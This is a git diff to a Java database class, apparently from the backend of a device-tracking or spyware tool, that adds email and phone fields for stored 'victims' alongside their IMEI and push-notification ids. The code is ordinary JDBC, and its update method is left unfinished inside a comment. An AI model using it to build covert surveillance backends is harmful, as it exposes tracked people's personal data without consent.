@@ -2,6 +2,7 @@ package com.theah64.xrob.api.database.tables;
 
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.Victim;
+import com.theah64.xrob.api.utils.PreparedUpdateQueryBuilder;
 
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -17,6 +18,9 @@ public class Victims extends BaseTable<Victim> {
     public static final java.lang.String COLUMN_API_KEY = "api_key";
     private static final String TABLE_VICTIMS = "victims";
     public static final String COLUMN_CLIENT_ID = "client_id";
+    public static final String COLUMN_EMAIL = "email";
+    public static final String COLUMN_PHONE = "phone";
+    private static final String COLUMN_FCM_UPDATED_AT = "fcm_updated_at";
 
     private Victims() {
     }
@@ -30,7 +34,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public Victim get(String byColumn, String byValue) {
 
-        final String query = String.format("SELECT api_key,fcm_id FROM victims WHERE %s = ? LIMIT 1", byColumn);
+        final String query = String.format("SELECT id,name,email,phone,api_key,fcm_id FROM victims WHERE %s = ? LIMIT 1", byColumn);
 
         final java.sql.Connection connection = Connection.getConnection();
         Victim victim = null;
@@ -41,11 +45,16 @@ public class Victims extends BaseTable<Victim> {
             ps.setString(1, byValue);
 
             final ResultSet rs = ps.executeQuery();
+
             if (rs.next()) {
                 //Collecting victim
+                final String id = rs.getString(COLUMN_ID);
+                final String name = rs.getString(COLUMN_NAME);
+                final String phone = rs.getString(COLUMN_PHONE);
+                final String email = rs.getString(COLUMN_EMAIL);
                 final String apiKey = rs.getString(COLUMN_API_KEY);
                 final String fcmId = rs.getString(COLUMN_FCM_ID);
-                victim = new Victim(null, null, apiKey, fcmId);
+                victim = new Victim(name, phone, email, null, apiKey, fcmId, id);
             }
 
             rs.close();
@@ -69,7 +78,7 @@ public class Victims extends BaseTable<Victim> {
     @Override
     public boolean add(Victim victim) {
 
-        final String addVictimQuery = "INSERT INTO victims (name,fcm_id,api_key,imei) VALUES (?,?,?,?);";
+        final String addVictimQuery = "INSERT INTO victims (name,fcm_id,api_key,imei,phone,email) VALUES (?,?,?,?,?,?);";
         final java.sql.Connection connection = Connection.getConnection();
 
         //To track the success
@@ -82,6 +91,8 @@ public class Victims extends BaseTable<Victim> {
             ps.setString(2, victim.getFCMId());
             ps.setString(3, victim.getApiKey());
             ps.setString(4, victim.getIMEI());
+            ps.setString(5, victim.getPhone());
+            ps.setString(6, victim.getEmail());
 
             isVictimAdded = ps.executeUpdate() == 1;
 
@@ -169,4 +180,51 @@ public class Victims extends BaseTable<Victim> {
 
         return isVictimUpdated;
     }
+
+    /**
+     * `id` int(11) NOT NULL AUTO_INCREMENT,
+     * `name` varchar(100),
+     * `email` VARCHAR (150),
+     * `phone` VARCHAR (20),
+     * `fcm_id` text,
+     * `fcm_updated_at` timestamp NULL,
+     * `api_key` varchar(10) NOT NULL,
+     * `imei` varchar(16) NOT NULL,
+     * `actions` varchar(100) DEFAULT NULL,
+     * `is_active` tinyint(4)   NOT NULL DEFAULT 1,
+     * `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
+     *
+     * @param victim
+     * @return
+     @Override public boolean update(Victim victim) {
+
+     boolean isUpdated = false;
+
+     final String updateQuery = new PreparedUpdateQueryBuilder(TABLE_VICTIMS)
+     .setIfNotNull(COLUMN_NAME, victim.getName())
+     .setIfNotNull(COLUMN_EMAIL, victim.getEmail())
+     .setIfNotNull(COLUMN_PHONE, victim.getPhone())
+     .setIfNotNull(COLUMN_FCM_ID, victim.getFCMId())
+     .setIfNotNull(victim.getFCMId(), COLUMN_FCM_UPDATED_AT, "CURRENT_TIMESTAMP", false)
+     .setWhereClause("id = ?")
+     .build();
+
+     System.out.println("Query : " + updateQuery);
+
+     final java.sql.Connection con = Connection.getConnection();
+     try {
+     final PreparedStatement ps = con.prepareStatement(updateQuery);
+
+     } catch (SQLException e) {
+     e.printStackTrace();
+     } finally {
+     try {
+     con.close();
+     } catch (SQLException e) {
+     e.printStackTrace();
+     }
+     }
+
+     return isUpdated;
+     }*/
 }
